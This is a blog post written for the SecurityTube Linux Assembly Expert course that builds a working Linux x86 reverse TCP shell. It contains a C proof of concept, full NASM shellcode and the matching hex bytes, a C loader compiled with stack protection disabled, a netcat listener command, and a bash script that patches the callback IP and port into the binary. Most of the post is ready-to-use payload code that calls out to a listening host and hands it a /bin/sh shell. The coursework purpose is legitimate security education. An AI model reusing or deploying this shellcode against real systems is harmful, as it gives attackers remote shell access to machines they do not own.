---
comments: true
date: 2014-04-04 07:03:42+00:00
layout: post
title: 'SLAE Assignment 2: Reverse Bind TCP Shellcode'
categories:
- programming
- SLAE
---

This is the second of the seven assignment necessary to accomplish the [SecurityTube Linux Assembly Expert](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html) certification. The instructions for this assignment are:



	
  1. Create a shellcode that reverse connect to a configured ip and port;

	
  2. The shellcode must execute /bin/sh on successful connection;

	
  3. IP and port number should be easily configurables


The difference between this assignment and the [previous one](http://www.paolostivanin.com/blog/2014/04/03/slae-assignment-1-bind-tcp-shellcode/) is that in the first assignment the shellcode "is a server" so we connect to it using netcat and then a shell is executed and "bound" to the **client terminal** while in this one the shellcode "is a client" so we need netcat running in listen mode on the configured ip and port and after a successful connection a shell **is bound to the server terminal**.

<!-- more -->

First of all i made a proof of concept of a program that connect to a configured ip (192.168.1.167) and port (7500) and execute /bin/sh on successful connection. I used dup2 to makes 0, 1 and 2 (stdin, stdout and stderr) be the copy of fd.

    
    #define STDIN 0
    #define STDOUT 1
    #define STDERR 2
    
    int main(void){
    	int fd;
    	struct sockaddr_in server_addr;
    	char *argv[] = { "/bin/sh", NULL };
    
    	server_addr.sin_family = AF_INET;
    	server_addr.sin_port = htons(7500);
    	server_addr.sin_addr.s_addr = inet_addr("192.168.1.167");
    
    	fd = socket(AF_INET, SOCK_STREAM, 0);
    
    	connect(fd, (struct sockaddr *)&server_addr, 16);
    
    	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
    	dup2(fd, STDIN);
    	dup2(fd, STDOUT);
    	dup2(fd, STDERR);
    
    	execve(argv[0], &argv[0], NULL);
    
    	return 0;
    }


As you can see in the above PoC, in our shellcode we'll need these syscall:



	
  1. two sys_socketcall(int call, unsigned long *args) where int call will be SYS_SOCKET and SYS_CONNECT according to /usr/include/linux/net.h;

	
  2. three sys_dup2(int oldfd, int newfd);

	
  3. one sys_execve(char *filename, char *argv[], char *envp[]) where both *argv[] and *envp[]** must be null terminated**


Below there is the complete shellcode:

    
    ;Description:	Assignment #2 (Reverse_Shell_Bind_TCP, 79 bytes)
    ;Shellcode:		\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x43\x68\xc0\xa8\x01\xa7\x66\x68\x1d\x4c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xf3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
    ;Author: 		Paolo Stivanin <https://github.com/polslinux>
    ;SLAE ID:		526
    
    global _start
    section .text
    _start:
    	;socket(): sys_socketcall(int call, unsigned long *args)
    	;eax -> sys_socketcall
    	;ebx -> SYS_{SOCKET(1),BIND(2),CONNECT(3),LISTEN(4),ACCEPT(5),...}
    	;ecx -> args(AF_INET{/usr/include/bits/socket.h -> 2}, SOCK_STREAM{/usr/include/bits/socket_type.h -> 1}, 0)
    	xor edx,edx
    	xor ebx,ebx
    	push BYTE 0x66 	;sys_socketcall
    	pop eax
    	inc ebx			;SYS_SOCKET
    	push edx		;0
    	push BYTE 1 	;SOCK_STREAM
    	push BYTE 2		;AF_INET
    	mov ecx,esp
    	int 0x80
    	xchg esi,eax
    
    	;connect(): sys_socketcall(int call, unsigned long *args)
    	;eax -> sys_socketcall
    	;ebx -> SYS_CONNECT
    	;ecx -> args(sockfd{esi}, {sa_family{2},sin_port{7500},sin_address{192.168.1.167}}, 16)
    	mov BYTE al,0x66
    	inc ebx
    	inc ebx					;SYS_CONNECT
    	push DWORD 0xa701a8c0	;192.168.1.167
    	push WORD 0x4c1d		;port 7500
    	push WORD 2				;AF_INET
    	mov ecx,esp
    	push BYTE 16
    	push ecx
    	push esi
    	mov ecx,esp
    	int 0x80
    
    	;dup2 sys_dup2(oldfd, newfd{0[stdin],1[stdout],2[stderr]})
    	mov ebx,esi
    	push BYTE 2
    	pop ecx
    lp:	mov BYTE al,0x3f
    	int 0x80
    	dec ecx
    	jns lp			;SF=0 positive, SF=1 negative. JNS (jump-if-not-sign) will loop while SF=0. When SF is set we reach a negative value so the loop stops.		
    
    	;execve /bin/sh
    	mov BYTE al,11
    	push edx
    	push 0x68732f2f
    	push 0x6e69622f
    	mov ebx,esp
    	push edx
    	mov edx,esp
    	push ebx
    	mov ecx,esp
    	int 0x80


I also used [libemu](http://libemu.carnivore.it/) and dot to produce a graph of the execution flow of the shellcode:

[![graph_assign2]({{ site.baseurl }}/images/2014/04/graph_assign2-601x1024.png)]({{ site.baseurl }}/images/2014/04/graph_assign2.png)

To assemble, link and get the hex shellcode I used the[ same script of Assignment 1](https://github.com/polslinux/SLAE/blob/master/utility/for-shellcode/alg-shell.sh).

Before executing the program the C source file must be updated with the newest shellcode:

    
    /* Template for running shellcode
     * Author: Paolo Stivanin <https://github.com/polslinux>
     * SLAE Student ID: 526
     */
    
    #include <stdio.h>
    #include <string.h>
    
    unsigned char shellcode[] = \
    "\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x43\x68\xc0\xa8\x01\xa7\x66\x68\x1d\x4c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xf3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
    
    int main(void){
    	printf("%zu\n", strlen(shellcode));
    	int (*ret)() = (int(*)())shellcode;
    	ret();
    	return 0;
    }


Now it's time to compile the file with gcc -fno-stack-protector -z execstack main.c -o Reverse_Shell_Bind_TCP (or with [this](https://github.com/polslinux/SLAE/blob/master/utility/for-shellcode/compile_gcc.sh) script) and then:



	
  1. open a terminal and type nc -v -l -p 7500

	
  2. execute Reverse_Shell_Bind_TCP


**[![ass2]({{ site.baseurl }}/images/2014/04/ass2-1024x575.png)]({{ site.baseurl }}/images/2014/04/ass2.png)**

The last point of this assignment ask to provide an easily way to configure the ip address and the port number. To accomplish this request I developed this small script:

    
    #!/bin/bash
    
    #Description:	Assignment #2 (Reverse_Shell_Bind_TCP, configure ip and port)
    #Author: 		Paolo Stivanin <https://github.com/polslinux>
    #SLAE ID:		526
    
    if [ -z "$1" ]; then
    	echo "Usage: $0 <elf-file>"
    	exit -1
    fi
    
    oldip=$(od -t x1 $1|grep -E -o "43 68.{0,12}"|sed 's/\ //g'|sed 's/^.\{4\}//g')
    hexoldip=$(printf '%s' $oldip | sed 's/../&\\x/g' | sed 's/\(\)/&\\x/' | sed 's/..$//')
    
    oldport=$(od -t x1 $1|grep -o -P "66 68.{6}"|sed 's/\(......\)//g'|sed 's/\ //g')
    hexoldport=$(printf '%s' $oldport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')
    
    echo "[?] Write IP in dotted format (eg 192.168.1.167): "
    read dotip
    hexip=$(printf '%02x' $(echo ${dotip//./ }))
    
    echo "[?] Write port number: "
    read port
    hexport=$(printf '%x' $port)
    
    echo "[+] HEX code of choosed IP: $hexip"
    echo "[+] HEX code of choosed port: $hexport"
    
    echo "[+] Updating $1 elf..."
    newport=$(printf '%s' $hexport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')
    sed -i "s/\x66\x68$hexoldport/\x66\x68$newport/g" $1
    newip=$(printf '%s' $hexip | sed 's/../&\\x/g' | sed 's/\(\)/&\\x/' | sed 's/..$//')
    sed -i "s/\x43\x68$hexoldip/\x43\x68$newip/g" $1
    
    echo "[+] All done :)"


All the sources can be found in my [Github page](https://github.com/polslinux/SLAE/).





This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
**Student ID: SLAE-526**
